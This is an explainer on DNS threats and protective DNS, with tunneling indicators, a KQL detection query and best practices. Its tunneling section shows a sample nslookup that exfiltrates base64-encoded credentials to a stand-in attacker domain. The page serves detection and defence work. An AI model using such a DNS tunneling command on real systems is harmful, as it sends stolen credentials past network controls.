DNS Security

DNS is the phonebook of the Internet—and a prime target for attackers. DNS security encompasses protective DNS services that block malicious domains, DNSSEC for authentication, and DNS logging for threat detection. Over 90% of malware uses DNS for command and control.

DNS Threat Landscape

DNS Hijacking

Attacker modifies DNS responses to redirect users to malicious sites. Enables phishing, credential theft, man-in-the-middle attacks.

DNS Tunneling

Exfiltrate data or establish C2 by encoding data in DNS queries/responses. Bypasses firewalls that allow DNS (port 53).

DNS Cache Poisoning

Inject false records into resolver cache. All subsequent queries get malicious response until TTL expires.

DGA Malware

Domain Generation Algorithms create thousands of random domains for C2. Hard to block without ML-based detection.

Traditional DNS vs. Protective DNS

Traditional DNS (ISP/Public)
  • Resolves any domain—good or bad
  • No filtering or blocking
  • No logging or visibility
  • No authentication (DNSSEC optional)
  • Susceptible to hijacking
  • C2 domains resolve normally

Risk: User clicks phishing link → DNS resolves malicious domain → credential harvesting page loads → no visibility that it happened.

Protective DNS
  • Blocks known malicious domains
  • Category-based filtering
  • Complete DNS query logging
  • Threat intelligence integration
  • DGA and tunneling detection
  • Sinkhole C2 domains

Benefit: User clicks phishing link → DNS query to protective DNS → domain on blocklist → returns NXDOMAIN → attack blocked before connection.

Detecting DNS Tunneling

DNS Tunneling Detection Indicators
# Normal DNS Query
nslookup www.google.com
→ Query length: 14 characters
→ Response: 142.250.80.4
→ Frequency: Occasional

# DNS Tunneling Query (data exfiltration)
nslookup dXNlcm5hbWU6cGFzc3dvcmQ=.data.evil-tunnel.com
→ Query length: 48 characters (base64 encoded data)
→ Subdomain: Encoded payload
→ Frequency: High volume, regular intervals

Detection Indicators:
  1. Long subdomain names (>50 chars)
  2. High entropy in subdomain (random-looking)
  3. Unusual query volume to single domain
  4. TXT record queries (often used for tunneling)
  5. Regular beacon intervals
  6. Queries to newly registered domains
  
KQL Detection Query:
DnsEvents
| where Name contains "."
| extend SubdomainLength = strlen(split(Name, ".")[0])
| where SubdomainLength > 50
| summarize QueryCount = count() by Computer, Name, bin(TimeGenerated, 1h)
| where QueryCount > 100

DNS Security Best Practices

DNS Security Implementation Guidelines

1. Deploy Protective DNS: Route all DNS through security-aware resolver. Block malware, phishing, C2 at the DNS layer—before connection.

2. Log All DNS Queries: DNS logs are gold for threat hunting. Correlate with endpoint, network, and identity data.

3. Block DNS over HTTPS (DoH) to External: DoH bypasses your protective DNS. Force internal DoH to your resolver or block external.

4. Enable DNSSEC Validation: Configure resolvers to validate DNSSEC. Protects against cache poisoning and hijacking.

5. Monitor for Tunneling: Alert on high-entropy subdomains, unusual TXT queries, and beacon-like patterns.

6. Category Filtering: Block newly registered domains (< 30 days). Most legitimate sites aren't brand new.
